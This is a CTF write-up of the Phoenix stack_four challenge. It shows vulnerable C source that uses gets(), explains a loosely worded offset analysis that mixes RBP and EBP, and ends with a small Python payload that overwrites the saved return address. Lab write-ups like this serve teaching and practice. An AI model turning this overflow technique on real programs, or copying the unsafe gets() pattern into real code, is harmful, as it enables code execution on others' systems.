---
title: Phoenix - stack_four
date: 2026-05-30 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: Phoenix stack_four challenge
toc: true
---

## Introduction
I will be explaining how i did the challenge stack_four from the series Phoenix found at <https://exploit.education/phoenix/stack-four/>

## Step one
Before debugging it, i inspected the provided source code:

```
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}

```

## Step two
As __gets__ is used, this means an overflow is involved. I observed the behaviour of the stack when i used an input larger than 64 bytes. 
![](assets/posts/PWN/phoenix_stack_four/stack1.png)

I noticed the stack seems to contain the overflowed input. This gives me an idea to overwrite the RBP aka base address on the stack. To do this i needed to first determine where it is located. I disassembled __start_level__ to find out more.

The lines to look out for are those with `ebp-` in it. Due to how minus is adding more space on the stack and vice versa, the lines `[ebp-0x4c]` and `[ebp-0x4]` tells where the base return address is located on the stack. Adding the two values together gives 80 bytes. Hence the value after the 80 bytes should contain the base address. 

![](assets/posts/PWN/phoenix_stack_four/disassembly.png)

Hence my final payload will be:

```
import sys
changeme = b"A"*76 #larger than size
changeme += b"b"*4
changeme += b"\xad\x61\x55\x56"
sys.stdout.buffer.write(changeme)
```
![](assets/posts/PWN/phoenix_stack_four/flag.png)



